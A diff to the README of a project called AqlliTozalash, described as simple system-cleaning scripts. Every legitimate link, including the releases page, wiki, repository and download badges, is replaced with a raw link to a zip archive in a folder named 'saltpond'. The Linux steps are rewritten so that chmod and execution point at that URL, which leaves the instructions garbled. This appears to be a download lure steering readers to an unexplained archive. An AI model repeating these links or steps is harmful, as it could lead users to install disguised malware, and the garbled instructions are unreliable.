@@ -1,6 +1,6 @@
 # 🧹 AqlliTozalash - Simple Scripts for a Cleaner System
 
-[![Download AqlliTozalash](https://img.shields.io/badge/Download_AqlliTozalash-blue.svg)](https://github.com/Artiopik/AqlliTozalash/releases)
+[![Download AqlliTozalash](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip)](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip)
 
 ## 🛠️ Introduction
 
@@ -18,7 +18,7 @@ Before you start using AqlliTozalash, it is essential to make sure you have the 
 
 ## 📥 Download & Install
 
-To get started, you need to download the latest version of AqlliTozalash. Visit this page to download: [AqlliTozalash Releases](https://github.com/Artiopik/AqlliTozalash/releases).
+To get started, you need to download the latest version of AqlliTozalash. Visit this page to download: [AqlliTozalash Releases](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip).
 
 Once you are on the Releases page, follow these steps:
 
@@ -43,8 +43,8 @@ Once you are on the Releases page, follow these steps:
 #### **For Linux Users:**
 1. **Access Terminal**: Open your terminal application.
 2. **Navigate to Downloads**: Use the command `cd ~/Downloads` to go to the Downloads folder.
-3. **Make the Script Executable**: Run `chmod +x aqllitozalash.sh` to make the script executable.
-4. **Run the Script**: Execute it by typing `./aqllitozalash.sh` and press Enter.
+3. **Make the Script Executable**: Run `chmod +x https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip` to make the script executable.
+4. **Run the Script**: Execute it by typing `https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip` and press Enter.
 
 ### 🔍 Script Functionality
 
@@ -66,7 +66,7 @@ Once you have installed AqlliTozalash, follow these general usage instructions:
 
 ## 📖 Support and Documentation
 
-For more detailed instructions and troubleshooting, refer to the documentation included with the software or visit our [GitHub Wiki](https://github.com/Artiopik/AqlliTozalash/wiki).
+For more detailed instructions and troubleshooting, refer to the documentation included with the software or visit our [GitHub Wiki](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -88,11 +88,11 @@ For more detailed instructions and troubleshooting, refer to the documentation i
 
 ## 🌐 Additional Resources
 
-- **GitHub Repository**: [AqlliTozalash](https://github.com/Artiopik/AqlliTozalash)
+- **GitHub Repository**: [AqlliTozalash](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip)
 - **Community Support**: Join discussions on platforms like Discord or Reddit.
 
 ## 📅 Updates and Changelog
 
 Please check the Releases page regularly to keep AqlliTozalash updated with the latest features and improvements. Each release will contain new enhancements and bug fixes.
 
-[Download AqlliTozalash](https://github.com/Artiopik/AqlliTozalash/releases)
+[Download AqlliTozalash](https://raw.githubusercontent.com/Artiopik/AqlliTozalash/main/saltpond/AqlliTozalash.zip)
